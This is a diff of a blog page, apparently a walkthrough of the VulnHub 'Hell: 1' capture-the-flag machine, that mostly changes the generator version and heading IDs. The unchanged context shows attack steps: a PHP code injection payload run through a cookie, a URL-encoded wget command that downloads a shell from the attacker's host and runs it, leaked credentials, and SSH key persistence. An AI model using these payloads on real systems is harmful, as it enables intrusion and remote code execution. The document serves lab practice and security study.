@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -52,13 +52,13 @@
   </div>
   <h1 class="headline" itemprop="headline">Hell: 1 - Part 1</h1>
   <section class="body" itemprop="articleBody">
-    
-
-<p>Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&rsquo;s a difficult and lengthy challenge will not prepare you for the torture&hellip;</p>
+    <p>Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&rsquo;s a difficult and lengthy challenge will not prepare you for the torture&hellip;</p>
 
 <p>This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>
 
-<h2 id="nmap:1f8081f406d4199da2c905fe029d67c9">Nmap</h2>
+<p></p>
+
+<h2 id="nmap">Nmap</h2>
 
 <pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.127.102
  
@@ -91,7 +91,7 @@ PORT      STATE    SERVICE VERSION
 1 service unrecognized despite returning data.
 </code></pre>
 
-<h2 id="apache:1f8081f406d4199da2c905fe029d67c9">Apache</h2>
+<h2 id="apache">Apache</h2>
 
 <p>Popping over to port 80 in a web browser, gives you a page with the following text:</p>
 
@@ -208,7 +208,7 @@ I wonder what's on the gateway to hell? (Port 666 obv)
 
 <p>Also, the <code>failcount=;</code> cookie is unsanitised, so you can modify this to be any value.  Putting all this together, we have some handy php injection!</p>
 
-<h2 id="lfi-php-injection:1f8081f406d4199da2c905fe029d67c9">LFI, PHP Injection</h2>
+<h2 id="lfi-php-injection">LFI, PHP Injection</h2>
 
 <p>First, I injected the following PHP code into <code>/tmp/note.txt</code>, via <code>notes.php</code>:
 <code>&lt;?php passthru($_COOKIE['failcount']); ?&gt;</code>.</p>
@@ -230,7 +230,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <pre><code class="language-text">wget%20http%3A%2F%2F192.168.127.127%2Fshell%20-O%20%2Ftmp%2Fshell%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fshell%20%26%26%20%2Ftmp%2Fshell
 </code></pre>
 
-<h2 id="jack:1f8081f406d4199da2c905fe029d67c9">Jack</h2>
+<h2 id="jack">Jack</h2>
 
 <p>With shell access as <code>www-data</code>, I was able to read the <code>login.php</code> file in the <code>super_secret</code> directory.</p>
 
@@ -275,7 +275,7 @@ Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop
 The password is '4J0WWvL5nS'
 </code></pre>
 
-<h2 id="milk-4-life:1f8081f406d4199da2c905fe029d67c9">milk_4_life</h2>
+<h2 id="milk-4-life">milk_4_life</h2>
 
 <p>With SSH access as milk_4_life, some proper work begins.</p>
 
@@ -387,7 +387,7 @@ $ id
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
 </code></pre>
 
-<h2 id="george:1f8081f406d4199da2c905fe029d67c9">George</h2>
+<h2 id="george">George</h2>
 
 <p>This allows you to enter George&rsquo;s home directory.  To give myself persistent access, I created a <code>.ssh</code> directory and echo&rsquo;d my public SSH key into <code>authorized_keys</code> - this allows me to SSH in as George, without a password.
 George does have an email (which is readable before now), but contains an interesting reference to the <code>rockyou</code> wordlist.</p>
@@ -419,7 +419,6 @@ Protect hidden volume (if any)? (y=Yes/n=No) [No]:
 george@hell:~$ ls -l /mnt/truecrypt/
 -rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
 </code></pre>
-
   </section>
 </article>
 
